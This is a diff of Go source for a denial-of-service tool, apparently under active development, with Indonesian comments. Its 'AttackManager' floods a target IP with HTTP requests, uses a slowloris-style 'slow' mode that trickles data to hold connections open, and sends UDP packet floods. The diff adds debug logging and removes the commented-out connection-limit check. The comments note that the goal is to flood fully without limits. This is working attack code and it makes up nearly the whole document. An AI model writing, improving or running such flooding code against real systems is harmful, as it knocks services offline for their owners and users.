@@ -234,7 +234,7 @@ func (am *AttackManager) generateUDPPacket() []byte {
 	return payload
 }
 
-func (am *AttackManager) openConnection(port int, limit int) { // 'limit' parameter is not used in this modified version
+func (am *AttackManager) openConnection(port int, limit int) { // 'limit' parameter is not used in this version
 	var conn net.Conn
 	var err error
 	
@@ -260,22 +260,25 @@ func (am *AttackManager) openConnection(port int, limit int) { // 'limit' parame
 		tcpConn.SetKeepAlivePeriod(30 * time.Second)
 	}
 
-	// Panggil wg.Add(1) SEBELUM membuat goroutine.
-	am.wg.Add(1)
+	// --- LOGGING DEBUG UNTUK WAITGROUP ---
+	// Nilai wg.Value() tidak tersedia secara langsung. Kita log alamatnya untuk konfirmasi.
+	log.Printf("DEBUG: openConnection for %s:%d. wg.Add(1) called. wg address: %p", address, port, &am.wg)
+	am.wg.Add(1) // Baris 265
+	// --- AKHIR LOGGING DEBUG ---
+
 	go func() {
-		// Panggil wg.Done() SEGERA di dalam goroutine.
-		defer wg.Done() 
+		// --- LOGGING DEBUG UNTUK WAITGROUP ---
+		log.Printf("DEBUG: Goroutine started for %s:%d. defer wg.Done() registered. wg address: %p", address, port, &am.wg)
+		defer func() {
+			log.Printf("DEBUG: Goroutine for %s:%d. Executing defer wg.Done(). wg address: %p", address, port, &am.wg)
+			wg.Done() // Baris 287
+			log.Printf("DEBUG: Goroutine for %s:%d. wg.Done() executed.", address, port)
+		}()
+		// --- AKHIR LOGGING DEBUG ---
 		defer conn.Close()
 
-		// >>>>>> BAGIAN BERIKUT DIKOMENTARI UNTUK PENGUJIAN <<<<<<
-		// >>>>>> Untuk menguji apakah masalah ada pada logika limit koneksi <<<<<<
-		// if am.attackType == "http" && am.atomicGet(&activeConnections) >= uint64(limit) {
-		//     am.log("Connection limit (%d) reached for %s. Closing connection.", limit, address)
-		//     return // defer wg.Done() akan dieksekusi.
-		// }
-		// >>>>>> Akhir dari bagian yang dikomentari <<<<<<
+		// Pengecekan limit koneksi DIKOMENTARI
 
-		// Tetap lakukan increment untuk statistik, meskipun tidak membatasi.
 		am.atomicInc(&activeConnections)
 		am.log("New connection opened to %s. Active: %d", address, am.atomicGet(&activeConnections))
 
@@ -288,6 +291,13 @@ func (am *AttackManager) openConnection(port int, limit int) { // 'limit' parame
 }
 
 func (am *AttackManager) httpAttackGoroutine(conn net.Conn, port int) {
+	// --- LOGGING DEBUG: Titik Masuk Goroutine Serangan ---
+	am.log("Entering httpAttackGoroutine for port %d. Connection: %s", port, conn.RemoteAddr())
+	defer func() {
+		am.log("Exiting httpAttackGoroutine for port %d.", port)
+	}()
+	// --- AKHIR LOGGING DEBUG ---
+
 	requestQueue := make(chan string, am.numSocketsPerThread*2)
 	for i := 0; i < am.numSocketsPerThread*2; i++ {
 		requestQueue <- am.generateHTTPRequest(am.targetIP, am.httpMethod, am.mode)
@@ -301,27 +311,19 @@ func (am *AttackManager) httpAttackGoroutine(conn net.Conn, port int) {
 		select {
 		case <-stopEvent:
 			am.log("Received stop signal. Exiting HTTP goroutine for %d.", port)
-			return
+			return // Keluar karena sinyal stop
 		default:
 		}
 
 		if am.durationSec != nil && time.Since(startTime).Seconds() > float64(*am.durationSec) {
 			am.log("Attack duration reached for %d. Stopping HTTP goroutine.", port)
-			return
+			return // Keluar karena durasi tercapai
 		}
-
-		// Perhatikan: Jika kita menghapus pengecekan limit di openConnection,
-		// baris ini mungkin perlu disesuaikan atau dihilangkan juga jika kita ingin
-		// membanjiri sepenuhnya tanpa rekursi pembuatan koneksi.
-		// Namun, untuk pengujian, biarkan saja dulu.
-		// if am.atomicGet(&activeConnections) < uint64(am.numSocketsPerThread) {
-		// 	go am.openConnection(port, am.numSocketsPerThread)
-		// }
 
 		if err := conn.SetReadDeadline(time.Now().Add(2 * time.Second)); err != nil {
 			am.atomicInc(&errorCount)
 			am.log("Failed to set read deadline for %d: %v", port, err)
-			return
+			return // Keluar karena error deadline
 		}
 		
 		buffer := make([]byte, 1)
@@ -330,19 +332,19 @@ func (am *AttackManager) httpAttackGoroutine(conn net.Conn, port int) {
 		if readErr != nil {
 			if netErr, ok := readErr.(net.Error); ok && netErr.Timeout() {
 				if am.mode == "slow" && time.Since(lastWriteTime).Seconds() < 5 {
-					goto sendData
+					goto sendData // Lanjutkan jika mode slow dan baru saja menulis
 				}
 				
 				idleLoops++
 				if idleLoops > 5 {
 					am.log("Read timeout repeated for %d. Closing connection.", port)
-					return
+					return // Keluar karena timeout berulang
 				}
-				continue
+				continue // Coba baca lagi jika hanya timeout biasa
 			} else {
 				am.atomicInc(&errorCount)
 				am.log("Read error from %d: %v", port, readErr)
-				return
+				return // Keluar karena error baca lain
 			}
 		}
 
@@ -357,29 +359,29 @@ func (am *AttackManager) httpAttackGoroutine(conn net.Conn, port int) {
 
 			if am.mode == "normal" {
 				am.log("Received response for %d. Closing connection (normal mode).", port)
-				return
+				return // Keluar karena mode normal setelah menerima respon
 			}
 		} else {
 			am.log("Connection closed by peer on %d.", port)
-			return
+			return // Keluar karena koneksi ditutup oleh peer
 		}
 
 	sendData:
 		request, ok := <-requestQueue
 		if !ok {
 			am.log("Request queue empty for %d. Exiting.", port)
-			return
+			return // Keluar jika antrian request kosong
 		}
 
 		if err := conn.SetWriteDeadline(time.Now().Add(5 * time.Second)); err != nil {
 			am.atomicInc(&errorCount)
 			am.log("Failed to set write deadline for %d: %v", port, err)
-			return
+			return // Keluar karena error deadline tulis
 		}
 		if _, writeErr := conn.Write([]byte(request)); writeErr != nil {
 			am.atomicInc(&errorCount)
 			am.log("Write error to %d: %v", port, writeErr)
-			return
+			return // Keluar karena error tulis
 		}
 		am.atomicInc(&sentRequestsTotal)
 		lastWriteTime = time.Now()
@@ -389,12 +391,12 @@ func (am *AttackManager) httpAttackGoroutine(conn net.Conn, port int) {
 			if err := conn.SetWriteDeadline(time.Now().Add(5 * time.Second)); err != nil {
 				am.atomicInc(&errorCount)
 				am.log("Failed to set write deadline for slow data on %d: %v", port, err)
-				return
+				return // Keluar karena error deadline tulis
 			}
 			if _, writeSlowErr := conn.Write([]byte(slowData)); writeSlowErr != nil {
 				am.atomicInc(&errorCount)
 				am.log("Slow write error to %d: %v", port, writeSlowErr)
-				return
+				return // Keluar karena error tulis
 			}
 		}
 		
@@ -403,30 +405,37 @@ func (am *AttackManager) httpAttackGoroutine(conn net.Conn, port int) {
 }
 
 func (am *AttackManager) udpAttackGoroutine(conn net.Conn, port int) {
+	// --- LOGGING DEBUG: Titik Masuk Goroutine Serangan ---
+	am.log("Entering udpAttackGoroutine for port %d. Connection: %s", port, conn.RemoteAddr())
+	defer func() {
+		am.log("Exiting udpAttackGoroutine for port %d.", port)
+	}()
+	// --- AKHIR LOGGING DEBUG ---
+
 	startTime := time.Now()
 	for {
 		select {
 		case <-stopEvent:
 			am.log("Received stop signal. Exiting UDP goroutine for %d.", port)
-			return
+			return // Keluar karena sinyal stop
 		default:
 		}
 
 		if am.durationSec != nil && time.Since(startTime).Seconds() > float64(*am.durationSec) {
 			am.log("Attack duration reached for %d. Stopping UDP goroutine.", port)
-			return
+			return // Keluar karena durasi tercapai
 		}
 
 		payload := am.generateUDPPacket()
 		if err := conn.SetWriteDeadline(time.Now().Add(5 * time.Second)); err != nil {
 			am.atomicInc(&errorCount)
 			am.log("Failed to set write deadline for UDP on %d: %v", port, err)
-			return
+			return // Keluar karena error deadline
 		}
 		if _, writeErr := conn.Write(payload); writeErr != nil {
 			am.atomicInc(&errorCount)
 			am.log("UDP Write error to %d: %v", port, writeErr)
-			return
+			return // Keluar karena error tulis
 		}
 		am.atomicInc(&sentRequestsTotal)
 
